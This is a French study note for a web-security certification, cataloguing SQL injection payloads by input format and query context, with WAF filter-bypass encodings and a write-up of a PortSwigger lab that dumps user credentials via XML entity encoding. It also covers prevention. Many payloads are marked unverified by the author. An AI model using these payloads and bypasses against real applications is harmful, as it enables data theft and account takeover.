---
tags: [bscp, server-side, sql-injection]
niveau: practitioner
statut: en cours
---
# SQL injection in different contexts

## En bref
- Une injection SQL ne se limite pas à la query string. Toute entrée que l'application finit par placer dans une requête SQL est un point d'injection : corps JSON ou XML, champs de formulaire, cookies, en-têtes comme `User-Agent` ou `Referer`.
- Le format de l'entrée (XML, JSON, formulaire, multipart, cookie, en-têtes, chemin d'URL) change l'encodage à utiliser.
- Le contexte de la valeur (chaîne, numérique, `ORDER BY`, `LIMIT`, `IN`, `LIKE`, identifiant) change la façon d'en sortir.
- Les filtres faibles cherchent des mots-clés SQL en clair dans la requête. Le filtre et la base ne décodent pas l'entrée de la même façon : on exploite l'écart entre ce que voit le filtre et ce que reçoit la base.
- Cette note est la référence détaillée des formats et des contextes. [[SQL-injection]] n'en garde que la version synthétique.

## Conventions et légende
Conventions : `xyz` = valeur d'origine du paramètre ou du cookie ; `<CONDITION>` = condition testée ; le dernier `'` est parfois fourni par la requête d'origine ; les `|` sont échappés en `\|` dans les tableaux. Table de correspondance des lettres : `S` = 83 = 0x53, `U` = 85 = 0x55, `N` = 78 = 0x4e, `I` = 73 = 0x49, `O` = 79 = 0x4f.

Statuts :
- **Vérifié** : syntaxe certaine, ou documentée par la cheat sheet PortSwigger ou l'Academy. Cela ne veut pas dire rejoué : aucun de ces payloads n'a été rejoué pour cette note. Les mentions « lab de la note » renvoient à la solution consignée dans le journal.
- **À vérifier** : dépend du filtre, du moteur ou de l'application, ou doute de l'analyse.

## Types et variantes
Formats d'entrée :

| Format | Encodage propre | Piège principal | Catalogue |
|---|---|---|---|
| XML (texte et attributs) | Références numériques `&#x53;` ou `&#83;`, entités `&lt;` `&amp;` `&apos;` `&quot;` | Un `<` ou un `&` littéral casse le document | 3.2 |
| JSON | Séquences `\uXXXX`, `\"`, `\\` | Le document doit rester valide | 3.3 |
| Formulaire et URL (query string, corps, chemin) | Encodage URL simple ou double, `+` pour l'espace | `#` jamais envoyé, `+` ambigu selon le format | 3.4 |
| Multipart | Valeur de chaque partie, champ `filename` | Beaucoup de filtres ne parsent pas le multipart | 3.4 |
| Cookie | Décodage URL, parfois base64 ou JSON | Ne pas casser le cookie `session` | 3.5 |
| En-têtes | Aucun encodage propre | Pas de saut de ligne, signal parfois différé | 3.5 |

Contextes de la valeur injectée :

| Contexte | Sortie | Signal | Catalogue |
|---|---|---|---|
| Chaîne | Fermer le guillemet | Erreur avec un guillemet, normal avec deux | 3.1 |
| Numérique | Aucun guillemet à fermer | `2-1` donne la même page que `1` | 3.6 |
| Parenthèses (`IN`, `VALUES`, fonction) | Fermer `)` ou `'))` | Erreur qui disparaît avec la parenthèse | 3.1 et 3.7 |
| `ORDER BY`, `LIMIT` | Booléen ou erreur, `UNION` impossible après | L'ordre ou la page change | 3.7 |
| `LIKE` | Attention au `%` (`%25` dans une URL) | Joker qui matche tout | 3.7 |
| Identifiant (colonne, table) | Non paramétrable | Dépend de la requête | 3.7 |

Pas de guillemet disponible (filtré ou échappé par l'application) : littéraux hexadécimaux, `CHAR` ou `CHR`, guillemets dollar de PostgreSQL (voir 3.8).

#### Exemples de la note d'origine
En XML, on encode un caractère du mot-clé avec une référence numérique. Le `S` de `SELECT` devient `&#x53;`. Sonde corrigée (la version d'origine, `999 &#x53;ELECT * FROM information_schema.tables`, n'est pas une requête valide : `SELECT` après un nombre sans `UNION` est une erreur de syntaxe, et `*` renvoie plusieurs colonnes alors que le lab n'en accepte qu'une) :
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x55;NION &#x53;ELECT NULL</storeId>
</stockCheck>
```
En JSON, la même idée passe par une séquence unicode : `SELECT`, que le parseur JSON décode avant que la valeur n'atteigne la requête.

D'autres contournements du même esprit existent quand le filtre est naïf : alterner majuscules et minuscules (`SeLeCt`), remplacer les espaces par des commentaires (`UNION/**/SELECT`), doubler l'encodage URL (`%2527`), ou, sur MySQL seulement, utiliser le commentaire versionné (`/*!50000UNION*/`). Couper un mot-clé avec un commentaire (`SEL/**/ECT`) ne fonctionne pas en SQL standard : le commentaire découpe le mot en deux jetons et provoque une erreur de syntaxe. Certains endpoints acceptent aussi plusieurs formats : renvoyer en XML ou en JSON une requête prévue pour un formulaire peut suffire à passer à côté du filtre (méthode en 3.4).

## Comment détecter
Dans un corps XML ou JSON, il faut penser à l'échappement propre au format, sinon c'est le parseur qui plante avant la base et on conclut à tort que le champ est sain.

1. **Inventaire des entrées** : tester chaque entrée de la requête, pas seulement les paramètres visibles (corps, cookies, en-têtes, chemin, feuilles d'un JSON imbriqué).
2. **Sonde sans mot-clé** : un `'` isolé, puis `2-1` à la place d'un nombre, avant tout encodage. Comparer les réponses (erreur, contenu différent, délai). Critère de confirmation : voir [[SQL-injection]].
3. **Contexte de la valeur** : chaîne, numérique, parenthèse, clause (voir 3.1).
4. **Séparer filtre et base** : une réponse instantanée, un code 403 ou un message générique « attack detected » viennent du filtre ; une erreur SQL ou un contenu différent viennent de la base. Si le document est refusé par le parseur (400), l'échappement du format est faux, pas la base.
5. **Changement de Content-Type** : conserver les mêmes noms de paramètres, vérifier que le serveur accepte l'autre format, comparer la réponse, puis rejouer le payload dans le format moins surveillé (clic droit « Change body encoding » ou extension de conversion du Content-Type, à confirmer pour la version de Burp de l'opérateur).
6. **Outils** : Repeater, Intruder avec liste de payloads, Hackvertor, Param Miner pour les en-têtes cachés.

Un message du type « attack detected » ou un blocage immédiat signale un filtre sur les mots-clés. C'est le moment de passer à l'encodage plutôt que d'abandonner le point d'injection.

## Comment exploiter (principe)
1. Repérer une entrée qui atteint la base, quel que soit son format.
2. Détecter le contexte de la valeur (voir 3.1).
3. Constater qu'un payload classique est bloqué, ce qui prouve la présence d'un filtre.
4. Choisir le contournement dans l'ordre de coût : casse, espaces et commentaires, encodage du format, double encodage, changement de Content-Type, pollution de paramètres. Encoder d'abord le minimum, en général une ou deux lettres de chaque mot-clé interdit (`UNION`, `SELECT`). Si le filtre cherche aussi d'autres motifs (`information_schema`, `||`), il faut encoder l'ensemble : c'est ce que fait le lab, avec une balise Hackvertor autour de toute l'expression.
5. Terminer avec les techniques de [[SQL-injection-Union-Attacks]] (concaténation sur une seule colonne, par exemple `username || '~' || password` sur PostgreSQL, et énumération).

## Catalogue de payloads par catégorie

### 3.1 Détection du contexte

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Chaîne : erreur puis retour | `xyz'` puis `xyz''` | Valeur entre guillemets simples ; erreur ou anomalie avec un seul, normal avec deux | Vérifié |
| Chaîne entre guillemets doubles | `xyz"` puis `xyz""` | MySQL en mode ANSI_QUOTES ou noms d'identifiants | À vérifier |
| Chaîne : rupture par barre oblique inverse | `xyz\` | MySQL (échappement par barre oblique inverse) ; la chaîne se prolonge | À vérifier |
| Numérique : arithmétique | `2-1` à la place de `1` | Page identique à `id=1` si la valeur est évaluée | Vérifié |
| Numérique contre chaîne | `1'` puis `1''` : erreur dans les deux cas indique un numérique sans guillemets | Distingue les deux contextes avec `2-1` | Vérifié |
| Booléen numérique | `1 AND 1=1` puis `1 AND 1=2` | Numérique | Vérifié |
| Booléen chaîne | `xyz' AND '1'='1` puis `xyz' AND '1'='2` | Chaîne, dernier guillemet fourni par l'application | Vérifié |
| Concaténation neutre | `xyz'\|\|'` (Oracle, PostgreSQL), `xyz'+'` (SQL Server), `xyz' 'a` (MySQL) | Réponse inchangée indique une chaîne | Vérifié |
| Parenthèse ouverte | `xyz')` puis `xyz'))` | Contexte `IN (...)`, `VALUES (...)`, fonction | Vérifié |
| ORDER BY : position | `ORDER BY 1` puis `ORDER BY 9999` | Erreur hors plage indique le point | Vérifié |
| Sonde sans mot-clé (avant tout encodage) | `'`, `2-1`, `1 AND 1=1` | Prouve que l'entrée est évaluée avant de chercher un contournement | Vérifié |
| Séparer filtre et base | Comparer : réponse instantanée, code 403 ou message "attack detected" (filtre) contre erreur SQL ou contenu différent (base) | Toujours | Vérifié |
| Parseur du format | Envoyer le même payload brut : si le document est refusé (400, erreur de parseur), l'échappement du format est faux, pas la base | XML, JSON | Vérifié |

### 3.2 XML

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Sonde arithmétique | `<storeId>2-1</storeId>` | Le champ est évalué ; ne pas utiliser `+` en formulaire | Vérifié |
| Mot-clé en hexadécimal | `<storeId>1 &#x55;NION &#x53;ELECT NULL</storeId>` | Valeur numérique, parseur qui décode les entités avant la requête | Vérifié (lab de la note, forme générale) |
| Mot-clé en décimal | `<storeId>1 &#85;NION &#83;ELECT NULL</storeId>` | Filtre qui ne gère que l'hexadécimal | Vérifié |
| Tout encoder | `<storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;...</storeId>` | Filtre qui cherche aussi `information_schema`, `\|\|` ou les espaces | À vérifier |
| Zéros de tête | `&#x0053;ELECT` | Filtre qui compare une expression régulière stricte | À vérifier |
| Extension Burp | Surligner la valeur puis Extensions, Hackvertor, Encode, `dec_entities` ou `hex_entities` ; dans Repeater : `<@hex_entities>1 UNION SELECT ...</@hex_entities>` | Balise remplacée à l'envoi ; vérifier que la requête brute ne contient plus de mot-clé | Vérifié (lab de la note) |
| Charge utile du lab | `<storeId><@hex_entities>1 UNION SELECT username \|\| '~' \|\| password FROM users</@hex_entities></storeId>` | Une seule colonne affichée ; tout est décodé par le parseur ; concaténation Oracle et PostgreSQL | Vérifié (lab de la note) |
| Caractère `<` dans la charge utile | `&lt;` ou `&#x3c;` | Toujours : un `<` littéral casse le document | Vérifié |
| Caractère `&` dans la charge utile | `&amp;` (MySQL `&&` s'écrit `&amp;&amp;`) | Toujours | Vérifié |
| Attribut | `<item id="1&apos; OR &apos;1&apos;=&apos;1">` | La valeur est un attribut entre guillemets doubles ; en simples utiliser `&quot;` | À vérifier |
| Section CDATA | `<![CDATA[1 UNION SELECT ...]]>` | Évite d'échapper `<` et `&` ; les entités ne sont plus décodées dedans, donc incompatible avec l'encodage | À vérifier |
| Double décodage | `&amp;#x53;` | Application qui décode deux fois ; rare | À vérifier |

Pièges XML :
- Les entités ne sont décodées que dans le texte des éléments et des attributs, pas dans une section CDATA ni dans un commentaire.
- Un `+` est littéral en XML (pas un espace) ; l'encodage URL n'est pas décodé dans un corps XML.
- Si Hackvertor n'est pas disponible, la même transformation s'écrit à la main lettre par lettre.
- `Content-Type: application/xml` ou `text/xml` : conserver celui d'origine.
- Le caractère nul n'est pas autorisé en XML 1.0, l'utiliser casse le document.

### 3.3 JSON

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Mot-clé en unicode | `{"id":"1 \u0055NION SELECT NULL"}` | Parseur JSON qui décode `\uXXXX` avant la requête | Vérifié (syntaxe) |
| Guillemet simple | `{"name":"xyz'--"}` | Filtre sur le caractère `'` ; le `'` n'a pas besoin d'échappement en JSON | Vérifié (syntaxe) |
| Espace remplacé par un commentaire | `{"id":"1/**/UNION/**/SELECT/**/NULL"}` | Filtre sur l'espace | Vérifié (syntaxe) |
| Guillemet double dans la valeur | `\"` | Valeur entre guillemets doubles dans la requête SQL | Vérifié |
| Barre oblique inverse | `\\` | Toujours : une barre seule est invalide en JSON | Vérifié |
| Type nombre contre chaîne | `{"id":1}` remplacé par `{"id":"1 AND 1=1"}` | Le champ nombre devient une chaîne ; peut être refusé par un typage strict | À vérifier |
| Tableau (clause IN) | `{"ids":[1,"2) OR 1=1-- "]}` | Valeurs concaténées dans `IN (...)` | À vérifier |
| Clé imbriquée | `{"filter":{"category":"Gifts'--"}}` | Tester chaque feuille du document | Vérifié |
| Doublon de clé | `{"id":1,"id":"1' OR '1'='1"}` | Filtre et application lisent des clés différentes (première ou dernière) | À vérifier |

Pièges JSON :
- Le JSON doit rester valide : `{"id":1 OR 1=1}` est refusé, mettre le payload dans une chaîne.
- `\u0000` peut tronquer la valeur dans certains parseurs et PostgreSQL refuse le caractère nul dans un texte.
- Dans le corps JSON le `+` est un plus littéral, comme en XML.

### 3.4 Formulaire et URL (query string, corps, chemin, multipart)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Encodage simple | `%27` (`'`), `%20` ou `+` (espace), `%23` (`#`), `%2d%2d` (`--`) | Query string et formulaire, valeur interprétée comme URL | Vérifié |
| Double encodage | `%2527` (pour `'`), `%2553ELECT` | Un composant décode une fois, un second décode encore | À vérifier |
| Espace remplacé | `UNION/**/SELECT`, `UNION%0aSELECT`, `%09`, `%0b`, `%0c`, `%0d` ; MySQL aussi `%a0` | Filtre sur l'espace | Vérifié (syntaxe), effet sur filtre À vérifier |
| Sans espace par parenthèses | `UNION(SELECT(NULL))` | Filtre sur l'espace | Vérifié (syntaxe) |
| Chemin d'URL | `/product/1%20AND%201=1`, `/api/items/1'--` | Valeur du dernier segment ; `#` jamais envoyé, `/` impossible dans la valeur | Vérifié |
| Paramètre de chemin | `/item;id=1'` | Cadre qui lit les paramètres de chemin | À vérifier |
| Pollution : concaténation côté ASP.NET | `a=1' UNION/*&a=*/SELECT NULL--` | Le serveur concatène les valeurs avec une virgule ; filtre qui voit deux paramètres | À vérifier |
| Pollution : première ou dernière valeur | `id=1&id=2' OR '1'='1` ou l'inverse | PHP garde la dernière, Tomcat la première ; le filtre peut lire l'autre | À vérifier |
| Changement de méthode | Convertir GET en POST (clic droit "Change request method") | Le filtre ne couvre que l'une | À vérifier |
| Changement de Content-Type | Corps `id=1'` converti en JSON `{"id":"1'"}` ou en XML | Le serveur accepte plusieurs formats et le filtre ne gère que le formulaire | À vérifier |
| Multipart : valeur d'une partie | `Content-Disposition: form-data; name="id"` puis la valeur `1'` | Le filtre ne parse pas le multipart | À vérifier |
| Multipart : nom de fichier | `filename="a.jpg' OR '1'='1"` | Nom stocké en base ou journalisé | À vérifier |
| Multipart : jeu de caractères | `Content-Type: multipart/form-data; charset=ibm037` avec corps encodé | Filtre qui décode mal ; technique avancée | À vérifier |

Pièges formulaire et URL :
- `+` vaut un espace en formulaire et en query string, pas dans un cookie, un corps JSON ou un corps XML.
- `#` non encodé ne part pas au serveur ; `%` doit être envoyé `%25` (important pour `LIKE`).
- Le Content-Length doit rester cohérent après modification (Burp le recalcule).
- Pas de `?` dans un chemin de requête REST : un `?` ouvre la query string.
- Comportement de la pollution de paramètres par plateforme : ASP.NET concatène les valeurs avec une virgule, PHP garde la dernière valeur, Tomcat garde la première.

### 3.5 Cookie et en-têtes

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Cookie de suivi | `TrackingId=xyz'\|\|(SELECT ...)\|\|'` | Forme équilibrée sans commentaire final ; ne pas toucher à `session` | Vérifié |
| Point-virgule | `%3B` | Pile de requêtes dans un cookie | Vérifié |
| Cookie en base64 | décoder, injecter dans la valeur, ré-encoder (Inspector de Burp) | Valeur du cookie opaque | Vérifié |
| Cookie en JSON | `{"uid":"1' OR '1'='1"}` après décodage URL, ré-encoder | Cookie qui transporte du JSON | À vérifier |
| `User-Agent` | `User-Agent: Mozilla' OR '1'='1` ou `x','y')--` | Journalisation par `INSERT` ; signal différé | À vérifier |
| `Referer`, `X-Forwarded-For` | `X-Forwarded-For: 127.0.0.1'` | Adresse stockée ou comparée | À vérifier |
| `Host`, `Accept-Language` | valeur avec `'` | Cadre qui lit l'en-tête | À vérifier |
| Injection dans un INSERT | `x'\|\|(SELECT version())\|\|'` | Le résultat est stocké puis affiché plus tard (second ordre) | À vérifier |

Pièges cookie et en-têtes :
- Un en-tête ne peut pas contenir de saut de ligne.
- Le signal peut être différé : le résultat apparaît sur une autre page ou plus tard.
- Voir [[Blind-SQL-injection]] et [[Blind SQLi - Triggering time delay]] pour les contraintes de cookie, sans les répéter.

### 3.6 Contexte numérique

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Booléen | `1 AND 1=1` puis `1 AND 1=2` | Pas de guillemet à fermer | Vérifié |
| Union | `-1 UNION SELECT NULL,NULL--` | Valeur négative ou inexistante pour isoler la ligne injectée | Vérifié |
| Colonnes | `1 ORDER BY 3--` | Voir [[SQL-injection-Union-Attacks]] | Vérifié |
| Délai | `1 AND IF(<CONDITION>,SLEEP(10),0)-- -` (MySQL) | Détails dans la note du délai | Vérifié |
| Hexadécimal | `0x31` à la place de `1` | MySQL ; filtre sur les chiffres | À vérifier |
| Sans `OR` ni `AND` | `1 \|\| 1=1` (PostgreSQL, Oracle), `1 && 1=1` (MySQL, écrire `&amp;&amp;` en XML) | Filtre sur les mots `AND` et `OR` | Vérifié (syntaxe) |

### 3.7 ORDER BY, LIMIT, IN, LIKE, noms de colonne et de table

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Colonne contrôlée | `sort=price` puis `sort=price DESC` | Le tri change ; pas de guillemet | Vérifié |
| Booléen dans ORDER BY | `sort=(CASE WHEN (<CONDITION>) THEN price ELSE name END)` | Deux colonnes de tri distinctes ; signal : l'ordre change | Vérifié (syntaxe) |
| Booléen MySQL | `sort=IF(<CONDITION>,price,name)` | MySQL | Vérifié (syntaxe) |
| Erreur conditionnelle | `sort=(CASE WHEN (<CONDITION>) THEN 1/0 ELSE 1 END)` | Moteur qui lève une erreur de division ; Oracle : `TO_CHAR(1/0)` | À vérifier |
| Sous-requête dans ORDER BY | `sort=(SELECT 1)` | Accepté selon le moteur | À vérifier |
| ORDER BY et UNION | `UNION` doit précéder `ORDER BY` : on ne peut pas ajouter d'`UNION` après | Voie fermée ; utiliser le booléen ou l'erreur | Vérifié |
| LIMIT | `LIMIT 10` remplacé par `LIMIT 10 OFFSET 0` ; ajout de `;` + requête empilée (PostgreSQL) | `UNION` interdit après `LIMIT` sans parenthèses | À vérifier |
| LIMIT avec sous-requête | `LIMIT (SELECT 1)` | PostgreSQL ; refusé par MySQL | À vérifier |
| IN | `1) OR (1=1` ou `1) UNION SELECT NULL--` | La valeur est dans `IN (...)` ; fermer la parenthèse | Vérifié |
| LIKE chaîne | `xyz%' AND '1'='1` et `%25` dans une URL | Le `%` est un joker, encoder en `%25` | Vérifié |
| LIKE joker seul | `%` ou `_` | Valeur qui matche tout, signal booléen | Vérifié |
| Nom de colonne | `SELECT <valeur> FROM ...` ; payload `(SELECT ...)` ou `price,(SELECT ...)` | Le paramètre est un identifiant ; non paramétrable | À vérifier |
| Nom de table | `FROM prefix_<valeur>` ; `users WHERE 1=1--` ou `x UNION SELECT ...` | Table dérivée de l'entrée | À vérifier |
| INSERT, UPDATE | `x')--` ou `x', (SELECT ...))--` | Modifie des données : lecture seule recommandée | À vérifier |

### 3.8 Contournement générique de filtre

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Casse | `UnIoN SeLeCt` | Filtre sensible à la casse | Vérifié |
| Mot retiré une fois | `UNUNIONION SELSELECTECT` | Filtre qui supprime le mot une seule fois, sans boucle | Vérifié (logique), À vérifier selon filtre |
| Commentaire à la place de l'espace | `UNION/**/SELECT` | Filtre sur l'espace | Vérifié (syntaxe) |
| Commentaire versionné | `/*!50000UNION*/ /*!50000SELECT*/` | MySQL et MariaDB uniquement | Vérifié (syntaxe) |
| Commentaire dans le mot | `SEL/**/ECT` | Ne fonctionne pas en SQL standard : le mot est coupé. Utile seulement si un composant retire les commentaires avant la base | À vérifier |
| Guillemet interdit : hexadécimal | `WHERE username=0x61646d696e` | MySQL ; ailleurs dépend du moteur | Vérifié (MySQL), SQL Server À vérifier |
| Guillemet interdit : CHAR | MySQL `CHAR(97,100)` ; SQL Server `CHAR(97)+CHAR(100)` ; PostgreSQL et Oracle `CHR(97)\|\|CHR(100)` | Chaîne littérale filtrée | Vérifié (syntaxe) |
| Guillemet interdit : dollar | `$$admin$$` | PostgreSQL | Vérifié (syntaxe) |
| Guillemets absents : sous-requête | `WHERE username=(SELECT username FROM users LIMIT 1)` | Aucun littéral | À vérifier |
| Égal interdit | `LIKE`, `IN ('a')`, `BETWEEN`, `>` et `<` avec ASCII | Filtre sur `=` | Vérifié |
| Commentaire final interdit | MySQL `#` encodé `%23` ; sinon forme équilibrée sans commentaire (`xyz' AND '1'='1`) | Filtre sur `--` | Vérifié |
| Exécution dynamique | SQL Server `EXEC('SEL'+'ECT ...')` ou `EXEC(0x...)` ; MySQL `PREPARE`/`EXECUTE` ; PostgreSQL `query_to_xml('select ...',true,true,'')` | Pile de requêtes ou fonction autorisée ; dernier recours | À vérifier |
| Caractère nul | `%00` placé avant le mot-clé | Filtre en C ou ancien WAF qui tronque ; PostgreSQL refuse `\0` | À vérifier |
| Recoupement des encodages | XML : décimal ou hexadécimal ; JSON : `\uXXXX` ; URL : simple ou double ; mélanger | Le filtre ne gère qu'un encodage | À vérifier |

Pièges communs : ne pas mélanger les encodages de formats différents ; encoder minimalement d'abord, puis étendre ; rejouer toujours le payload sans encodage dans un cas non filtré pour vérifier qu'il est correct ; comparer la réponse du filtre à celle de la base.

## Pièges et points d'attention BSCP
- L'encodage doit correspondre au format : références `&#x..;` en XML, `\u....` en JSON. Le serveur ne décode pas l'URL dans un corps XML ou JSON (sauf double décodage applicatif) : `%53` y reste littéral.
- En XML, un `<` ou un `&` littéral dans le payload casse le document. Les écrire `&lt;` et `&amp;` (ou les encoder en entités numériques). Le `>` est toléré en texte mais s'écrit `&gt;`.
- Encoder d'abord le minimum : plus on encode, plus on multiplie les occasions de produire un payload invalide. Mais si le filtre cherche aussi d'autres motifs, encoder l'ensemble comme dans le lab.
- Si rien ne passe, vérifier que l'entrée est bien vulnérable avec un test sans mot-clé (`'` seul, ou `2-1` à la place d'un nombre) avant de s'acharner sur le contournement. Préférer `2-1` à `1+1` : en formulaire ou en URL le `+` devient un espace, alors qu'en XML ou JSON c'est un plus littéral, et la sonde serait ambiguë.
- `UNION` est impossible après `ORDER BY` ou `LIMIT` : utiliser le booléen ou l'erreur.
- En JSON, un nombre devient une chaîne dès qu'on y met un payload ; le typage strict peut le refuser.
- Un commentaire à l'intérieur d'un mot-clé (`SEL/**/ECT`) est une idée reçue : il casse le mot au lieu de le cacher.
- Cookie, en-têtes : le signal peut être différé. Pour les pièges communs de cookie et de commentaire MySQL, voir [[SQL-injection]] plutôt que les répéter ici.

## Prévention
Les requêtes paramétrées règlent le problème quel que soit le format d'entrée, car la donnée n'est jamais interprétée comme du SQL. Un filtre ou un WAF ne remplace pas cette mesure : c'est une couche supplémentaire seulement. S'il y en a un, il doit normaliser l'entrée de la même façon que l'application avant de l'inspecter : un seul point de décodage, puis une validation sur la valeur décodée, jamais sur le brut. Une liste blanche de valeurs attendues (un identifiant de produit numérique, par exemple) réduit encore la surface.

Propre à cette note :
- Identifiants et `ORDER BY` par liste blanche (les requêtes préparées ne les protègent pas).
- Typage strict : conversion en entier côté serveur.
- Refus des Content-Type inattendus et rejet des paramètres dupliqués.
- En-têtes et cookies traités comme des entrées non fiables.
- Moindre privilège pour le compte de la base.
- Journalisation et alertes sur les blocages répétés.

## Labs PortSwigger
Aucune case n'est cochée dans cette note : l'opérateur n'a pas confirmé la réalisation du lab de filtre XML (à confirmer par l'opérateur). Ce lab n'est coché dans aucune autre note du vault et n'appartient à aucune des listes de [[Blind-SQL-injection]].

- [ ] Apprentice
- [ ] Practitioner : SQL injection with filter bypass via XML encoding (à confirmer par l'opérateur)
- [ ] Expert

État des autres notes de la catégorie, tel que relevé (cases non reprises ici) :
- [[SQL-injection]] : Apprentice coché le 2026-10-26 ; Practitioner et Expert non cochés.
- [[SQL-injection-Union-Attacks]] : Apprentice coché le 2026-10-26, Practitioner coché le 2026-10-27.
- [[Blind-SQL-injection]] : sept labs cochés le 2026-11-02 (conditional responses, conditional errors, visible error-based, time delays, time delays and information retrieval, out-of-band interaction, out-of-band data exfiltration), tous de niveau Practitioner d'après l'agent.
- [[Blind SQLi - Triggering time delay]] : Practitioner coché le 2026-11-02, sur la base de [[Blind-SQL-injection]].

## Journal des labs
### Lab: SQL injection with filter bypass via XML encoding
- **Énoncé** : injection SQL dans la fonction de vérification de stock, dont les résultats sont renvoyés dans la réponse (attaque `UNION` possible). Une table `users` contient les identifiants et mots de passe. Objectif : récupérer ceux de l'administrateur puis se connecter.
- **Moteur et variante** : non confirmé dans la note (la concaténation `\|\|` fonctionne sur Oracle et PostgreSQL) ; `UNION` avec contournement de filtre par entités XML.
- **Signal observé** : le stock de magasins différents s'affiche quand l'expression est évaluée ; une page de blocage apparaît quand le filtre détecte `UNION SELECT` ; la réponse `0 units` indique une erreur quand on demande plus d'une colonne.
- **Méthode** :
	1. La requête `POST /product/stock` envoie `productId` et `storeId` en XML ; l'envoyer dans Repeater.
	2. Sonder `storeId` avec une expression qui vaut un autre identifiant de magasin, pour vérifier que la valeur est évaluée.
	3. Ajouter `UNION SELECT NULL` : la requête est bloquée comme attaque potentielle, donc un filtre est en place.
	4. Surligner la valeur, puis clic droit, Extensions, Hackvertor, Encode, `dec_entities` ou `hex_entities` (extension Hackvertor, lien en bas de note). Renvoyer : réponse normale, le filtre est contourné.
	5. Constater que la requête n'a qu'une colonne (plus d'une colonne donne `0 units`), d'où la concaténation (principe dans [[SQL-injection-Union-Attacks]]).
	6. Envoyer la charge utile finale, lire les couples utilisateur et mot de passe séparés par `~`, puis se connecter avec ceux de l'administrateur.
- **Payloads clés** (exacts) :
	- Sonde arithmétique : `<storeId>1+1</storeId>` (plus littéral en XML ; `2-1` est préférable, voir les pièges).
	- Requête bloquée : `<storeId>1 UNION SELECT NULL</storeId>`
	- Charge utile finale : `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`
- **Pièges rencontrés** : la requête est bloquée tant que les mots-clés sont en clair ; la balise Hackvertor entoure toute l'expression, pas seulement quelques lettres ; avec plus d'une colonne la réponse `0 units` fait croire à un échec alors que c'est une erreur de nombre de colonnes.
- **Statut et date** : non confirmé, aucune date. À confirmer par l'opérateur avant de cocher la case et de passer le statut à « terminé ».

## Liens
- [[SQL-injection]]
- [[SQL-injection-Union-Attacks]]
- [[Blind-SQL-injection]]
- [[Blind SQLi - Triggering time delay]]
- [[Error-based SQL Injection]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100 (extension Hackvertor)
